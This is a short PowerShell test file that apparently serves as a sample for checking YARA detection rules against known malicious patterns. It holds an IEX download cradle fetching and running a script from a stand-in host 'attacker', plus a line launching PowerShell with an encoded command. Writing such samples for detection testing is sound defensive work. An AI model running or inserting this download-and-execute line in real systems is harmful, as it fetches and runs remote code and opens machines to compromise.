# evil_demo.ps1
# Demonstration of potentially malicious PowerShell commands
# This file is used for testing YARA rules against known evil patterns

IEX (New-Object Net.WebClient).DownloadString('http://attacker/evil.ps1')
Invoke-Command -ScriptBlock { Start-Process powershell -ArgumentList '-NoProfile -EncodedCommand d2hvYW1p'}

